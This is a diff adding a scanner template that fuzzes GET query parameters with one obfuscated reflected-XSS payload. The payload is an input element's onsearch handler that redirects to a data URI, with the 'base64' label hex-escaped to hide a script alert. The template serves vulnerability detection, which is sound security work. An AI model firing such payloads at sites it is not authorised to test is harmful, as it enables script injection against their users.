@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-input
+
+info:
+  name: Input Reflection XSS Detection
+  author: netbaan
+  severity: low
+  description: |
+    This template is designed to detect reflection XSS vulnerabilities using a specific input payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "<input type=search onsearch=\"location='data:text/html;\\x62\\x61\\x73\\x65\\x36\\x34,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='\">"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
